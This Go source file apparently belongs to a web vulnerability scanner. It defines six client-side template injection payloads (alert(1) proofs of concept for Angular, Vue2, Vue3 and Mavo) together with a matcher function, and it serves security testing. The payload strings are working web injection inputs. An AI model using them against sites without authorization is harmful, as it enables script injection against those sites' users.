package payloads

import "regexp"

type CSTIPayload struct {
	BasePayload
	Value    string
	Platform string
}

// GetValue gets the payload value as string
func (p CSTIPayload) GetValue() string {
	return p.Value
}

// MatchAgainstString Checks if the payload match against a string
func (p CSTIPayload) MatchAgainstString(text string) (bool, error) {
	return regexp.MatchString(p.Value, text)
}

func GetCSTIPayloads() (payloads []PayloadInterface) {
	// https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti
	payloads = append(payloads, CSTIPayload{
		Value:    "{{$on.constructor('alert(1)')()}}",
		Platform: "Angular",
	})
	payloads = append(payloads, CSTIPayload{
		Value:    "{{constructor.constructor('alert(1)')()}}",
		Platform: "Angular",
	})
	payloads = append(payloads, CSTIPayload{
		Value:    "{{constructor.constructor('alert(1)')()}}",
		Platform: "Vue2",
	})
	payloads = append(payloads, CSTIPayload{
		Value:    "{{_openBlock.constructor('alert(1)')()}}",
		Platform: "Vue3",
	})
	payloads = append(payloads, CSTIPayload{
		Value:    "[self.alert(1)]",
		Platform: "Mavo",
	})
	payloads = append(payloads, CSTIPayload{
		Value:    "javascript:alert(1)%252f%252f..%252fcss-images",
		Platform: "Mavo",
	})
	return payloads
}
